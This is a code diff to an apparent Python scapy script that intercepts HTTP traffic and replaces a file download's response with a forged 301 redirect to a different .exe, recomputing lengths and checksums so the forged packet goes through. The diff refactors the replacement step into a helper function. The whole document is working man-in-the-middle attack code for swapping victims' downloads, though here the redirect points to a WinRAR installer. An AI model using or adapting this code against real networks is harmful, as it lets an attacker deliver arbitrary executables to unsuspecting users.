@@ -4,6 +4,16 @@ import scapy.all as scapy
 
 ack_list = []
 
+def set_load(packet, load):
+    '''Replaces the HTTP Download Response packet'''
+    print("[+] Replacing file")
+    packet[scapy.Raw].load = load
+    # deleting packets security details
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
 def process_packet(packet) -> None:
     '''Accepts a packets and print it'''
     # converting packet to scapy packets
@@ -18,15 +28,11 @@ def process_packet(packet) -> None:
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file")
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
-                
-                # deleting packets security details
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].chksum
+
+                load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
+                modified_packet = set_load(scapy_packet, load)
                 # converting scapy packet to normal packet
-                packet.set_payload(str(scapy_packet))
+                packet.set_payload(str(modified_packet))
                 
     packet.accept() # To accept packet and forward it to destination
     # packet.drop() # To accept packet and drop it
